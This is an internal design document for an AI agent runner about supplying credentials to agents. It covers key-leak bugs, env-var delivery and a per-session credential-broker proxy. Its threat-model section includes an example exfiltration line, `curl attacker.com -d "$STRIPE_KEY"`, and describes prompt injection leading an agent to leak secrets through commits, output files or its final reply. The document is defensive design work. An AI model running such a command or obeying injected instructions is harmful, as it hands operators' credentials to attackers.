# Agent Access to Sensitive/External Data — Design Analysis

Status: **design discussion, not implemented.** Captures the analysis and open decisions before any code is written.

## Motivation

Agent tasks sometimes need to call external authorized services (e.g. a Stripe lookup, an internal API, a Slack post) that require credentials. Today agent-runner has no supported way to hand a task-specific secret to the agent — the only existing mechanism is incidental and unsafe (see below).

## Current state

- All configuration (including agent-runner's own operational secrets — `ANTHROPIC_API_KEY`, `GIT_TOKEN`, `MEMORY_GIT_TOKEN`, bot tokens, etc.) lives in one flat env var / `.env` / `.env.local` namespace. `.env`/`.env.local` are gitignored; `.env.local` is written with `0600` perms (parent dir `0700`).
- Git tokens (`GIT_TOKEN`, `MEMORY_GIT_TOKEN`) are handled well already: a git `credential.helper` script reads the token from the *subprocess environment* at invocation time (`echo "password=$GIT_TOKEN"`), so the raw value is never written to git config, never embedded in a remote URL, and never appears in the agent's prompt or the markdown audit log. This is the pattern the proposed design below reuses.
- Two real gaps found while reviewing this:
  1. **`isSensitiveKey()` bug** (`internal/api/command.go:1365`) — matches suffixes `_API_KEY`, `_TOKEN`, `_SECRET`, `_PASSWORD`, but the bare `API_KEY` var (agent-runner's own REST API auth key) is one character short of ever matching `_API_KEY`. `/set API_KEY <value>` echoes the raw value back in the chat reply, unlike every other secret. Not yet fixed.
  2. **`{{API_KEY}}` prompt-template variable** (`internal/template/vars.go`, substituted in `internal/api/agent_executor.go:768`) — the REST API key is available as a template variable inside `agent.md`/`prompt.md`. Unused in the shipped default templates (dormant), but if a custom prompt references it, the raw key becomes part of every LLM request for that session and gets written in cleartext into the markdown audit log under `logs/`.

## Proposed design (env-var delivery)

**Core principle:** the LLM prompt only ever sees a secret's *name* and *purpose*, never its *value*. The value exists only as an environment variable in the CLI subprocess's env, following the git-token precedent above.

- **Storage**: a dedicated `DATA_DIR/secrets.json` (0600 perms, gitignored), kept separate from the general `.env`/`.env.local` namespace so operator secrets and agent-facing secrets can't be confused:
  ```json
  {
    "STRIPE_KEY": {"value": "sk_live_...", "description": "read-only Stripe API key for order lookups"}
  }
  ```
- **Config surface**: `/secret set NAME VALUE --desc "..."`, `/secret list` (names + descriptions only, never values), `/secret remove NAME` — parallel to the existing `/repo add/list/remove` commands.
- **Surfacing to the agent**: reuse the skills-manifest pattern shipped earlier this session (planner now gets an "Available skills" list of name+description, never full content). Same idea here: the planner/iteration prompt gets a short manifest, e.g. "`STRIPE_KEY` — read-only Stripe API key for order lookups, available as `$STRIPE_KEY`" — the agent knows the secret exists and what it's for, then references `$STRIPE_KEY` in whatever shell command it runs.

### Open decisions (env-var version)

1. **Blast radius / scoping** — do secrets follow the "shared repos" model (all configured secrets injected into every workspace), or require an explicit allowlist (per-request on `POST /agent`, or per-project like `AllowedProjects`)? Leaning toward requiring an explicit allowlist by default, since secrets are higher-stakes than "which repos are visible" — but this is a real security/convenience tradeoff.
2. **How far to build now** — static secrets in `secrets.json` for v1, vs. a pluggable backend to an external secrets manager (Vault, 1Password, AWS Secrets Manager) later. No evidence yet this needs more than a single-operator tool requires; recommend punting the pluggable-backend question until there's a concrete need.

## The critical gap: prompt injection / exfiltration

**The env-var approach only prevents *accidental* leakage (into prompts/logs). It does nothing against a genuinely malicious or prompt-injected task.**

An agent that *holds* a secret as an env var, running with `--dangerously-skip-permissions` and full shell/tool access, can be manipulated (via prompt injection from untrusted repo content, task input, or fetched web content) into exfiltrating it — e.g. `curl attacker.com -d "$STRIPE_KEY"`, committing it into a file that gets pushed, writing it to a `_send/` output file, or simply printing it in the final response (which the audit logger records verbatim). Handing over the raw value means there is something for an adversary to steal; no amount of "keep it out of the prompt text" changes that once the agent's execution environment has the value in hand.

## The architecturally sound fix: a per-session credential broker

Don't give the agent the secret at all — give it a **scoped proxy that performs the authorized action on its behalf**.

- agent-runner starts a localhost-only HTTP server (or Unix socket) per session, pre-configured with rules like: forward requests to `https://api.stripe.com/*`, attaching `Authorization: Bearer <real key>` server-side.
- The agent's manifest tells it "for Stripe access, send requests to `http://localhost:$PORT/proxy/stripe/...` instead of the real API" — it never sees the actual key. A compromised/injected task can only *use* the proxy for whatever operations were allowed (e.g. read-only order lookups); it cannot turn that into possession of the raw key.
- Least-privilege scoping of the underlying credential (a restricted/read-only key where the third-party service supports it) further limits blast radius, but the proxy is what actually closes the exfiltration path — scoping the key alone does not.

### Explicit limitation

The broker only protects *the specific secret it fronts*. It does nothing about the agent's broader, unrestricted outbound network access — it can still exfiltrate anything else it can read (repo contents, other workspace files) to an attacker-controlled host. Closing that fully requires network egress control / sandboxing the workspace execution itself (e.g. running the CLI in a container with an allowlisted network policy), which agent-runner does not have today — the CLI runs as a bare subprocess on the host. That is a materially bigger change than anything built so far and is out of scope for this design.

## Decision needed before implementing

Pick one of:

- **(A) Env-var delivery only** (Tier 0/1: manifest-based naming to avoid *accidental* leakage, plus recommending least-privilege/read-only keys where possible). Cheap, flexible, but the exfiltration hole from prompt injection stays open.
- **(B) Credential broker** for secrets that front a specific external API (Tier 2). Meaningfully closes the exfiltration path for those secrets specifically. Moderate implementation effort (a reverse proxy with per-secret route rules, started/torn down per session). Does not address general network exfiltration of other data.

Both share the same storage (`secrets.json`) and manifest-surfacing mechanism; (B) changes only the delivery mechanism from "raw env var" to "proxy endpoint," so starting with (A) and adding (B) later per-secret is viable if that's preferred.
